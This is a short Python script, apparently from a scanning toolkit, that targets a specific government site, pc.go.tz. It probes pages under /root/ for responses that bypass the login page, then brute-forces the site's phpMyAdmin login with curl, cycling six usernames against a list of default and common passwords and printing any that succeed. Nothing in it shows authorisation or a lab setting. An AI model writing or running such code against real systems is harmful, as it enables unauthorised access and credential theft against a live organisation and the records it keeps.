"""Hunt unprotected pages under /root/ and retry phpMyAdmin with more creds."""
import sys

sys.path.insert(0, ".")
import scan  # noqa: E402

ROOT_PATHS = ["index.php", "home.php", "dashboard.php", "main.php", "users.php",
              "pharmacists.php", "applications.php", "payments.php", "reports.php",
              "profile.php", "settings.php", "search.php", "list.php", "view.php",
              "upload.php", "export.php", "admin.php", "menu.php", "header.php"]

print("== /root/ pages (login page is 4960 bytes; anything else is interesting)")
for p in ROOT_PATHS:
    r = scan.fetch("https://www.pc.go.tz/root/" + p)
    if not r:
        print(f"  {p:20} ERR")
        continue
    flag = "" if len(r["body"]) == 4960 else "   <<< DIFFERS"
    if r["status"] != 404 or flag:
        print(f"  {p:20} {r['status']} {len(r['body'])}{flag}")

print("\n== phpMyAdmin credential retry")
USERS = ["root", "admin", "pma", "www", "pctz", "pharmacy"]
PWDS = ["root", "password", "Password", "Password1", "admin", "admin123",
        "123456", "12345", "1234", "toor", "letmein", "welcome", "changeme",
        "mysql", "pma", "secret", "test", "root123", "P@ssw0rd", "p@ssw0rd",
        "root@123", "Admin@123", "pharmacy", "pctz", "pctz123", "server"]
import subprocess  # noqa: E402

for u in USERS:
    for p in PWDS:
        out = subprocess.run(
            ["curl.exe", "-k", "-s", "-m", "10", "-o", "NUL", "-w", "%{http_code}",
             "-u", f"{u}:{p}", "https://www.pc.go.tz/phpmyadmin/"],
            capture_output=True, text=True).stdout.strip()
        if out and out != "401":
            print(f"  HIT {u}:{p} -> {out}")
    print(f"  -- {u} done")
